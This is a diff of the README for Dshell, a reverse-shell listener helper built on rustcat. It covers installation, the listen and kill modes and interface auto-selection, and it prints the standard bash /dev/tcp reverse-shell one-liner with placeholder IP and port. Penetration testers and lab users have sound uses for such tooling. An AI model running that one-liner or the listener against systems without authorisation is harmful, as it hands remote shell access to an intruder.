@@ -1,49 +1,61 @@
-# Dshell
-
-<br>
+# 🤔 What is this?
 
 ![](/Video/dshell.gif)
 
-> "A reverse shell shows that true control comes when the target reaches back willingly."
+Tired of manually upgrading your reverse shell every time? Let Dshell handle it for you!
 
-**Dshell** is a reverse shell script that prepares a responsive shell on a specified port using [rustcat](https://github.com/robiot/rustcat).
+Dshell is a tiny reverse-shell helper that spins up a responsive listener and automatically upgrade your terminal on a given port using [rustcat](https://github.com/robiot/rustcat)
 
 <br>
 
-## Features
+# ✨ Features
 
 * Quickly set up a reverse shell listener.
-* Kill running Dshell processes on demand.
-* Supports multiple network interfaces by default.
+* Fully responsive TTY with $${\text{\color{red}C}\text{\color{green}O}\text{\color{blue}L}\text{\color{yellow}O}\text{\color{orange}R}\text{\color{lightblue}S}}$$ and <ins>Tab Completion</ins>
+* Auto-selects the best network interface when none is provided.
+
+# 🛠️ Installation
+
+1. Ensure [rustcat](https://github.com/robiot/rustcat) is installed on your system.
+2.
+```sh
+git clone https://github.com/Bimo754/Dshell
+cd Dshell
+chmod +x install.sh
+./install.sh
+```
 
 <br>
 
-## Installation
 
-Ensure [rustcat](https://github.com/robiot/rustcat) is installed on your system.
+# 📖 Usage
 
-<br>
+**Dshell** has two modes, `listen` or `kill`
 
-## Usage
-
-### Help Menu
+## Help Menu
 
 ```sh
 dshell -h
-
-[Info] Usage:
-    /usr/local/bin/dshell -p <PORT> [IFACE|IP]
-    /usr/local/bin/dshell -k <PORT|all>
+```
+**Usage**
+```sh
+dshell -p <PORT> [IFACE|IP]
+dshell -k <PORT|all>
 ```
 
-### Run a Listener
+## Run a Listener
 
 ```sh
 dshell -p <PORT> [IFACE|IP]
 ```
 
-Dshell will output the most commonly used reverse shell `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'` with the supplied IP and PORT
-If no interface or IP is supplied, Dshell will try the following interfaces in order:
+Dshell will print the most commonly used reverse shell command (with the supplied IP and PORT), for example:
+
+```sh
+bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
+```
+
+If you don't supply an interface or IP, Dshell will try these interfaces in order:
 
 * `tun1`
 * `tun0`
@@ -51,18 +63,18 @@ If no interface or IP is supplied, Dshell will try the following interfaces in o
 * `eth0`
 * `lo`
 
-### Kill Running Processes
+## Kill Running Processes
 
 ```sh
 dshell -k <PORT|all>
 ```
 
-* `<PORT>` 		– Kill Dshell process running on a specific port.
-* `all` 		– Kill all Dshell processes.
+* `<PORT>` — Kill the Dshell process listening on the specified port.
+* `all`  — Kill all running Dshell processes.
 
 <br>
 
-### Examples
+# Examples
 
 Start a listener on port `4444` using `tun0` interface:
 
